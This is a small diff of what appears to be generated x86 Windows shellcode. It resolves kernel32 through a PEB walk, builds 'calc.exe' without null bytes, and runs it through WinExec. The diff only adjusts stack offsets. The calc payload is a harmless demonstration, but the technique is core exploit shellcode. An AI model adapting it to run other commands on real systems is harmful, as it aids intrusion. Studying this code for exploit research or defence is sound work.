@@ -137,7 +137,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -161,7 +161,7 @@ main:
 ; -- String Construction --
 
 ; --- cmd: "calc.exe" (mov) ---
-    lea  edi, [ebp-0x8c]
+    lea  edi, [ebp-0x10c]
 ; emit_mov: "calc.exe" (null-safe)
 ; 12 bytes written to [edi]
 
@@ -207,7 +207,7 @@ wf_entry:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0x8c]
+    lea  eax, [ebp-0x10c]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x24]
     mov  [ebp-0x2c], eax
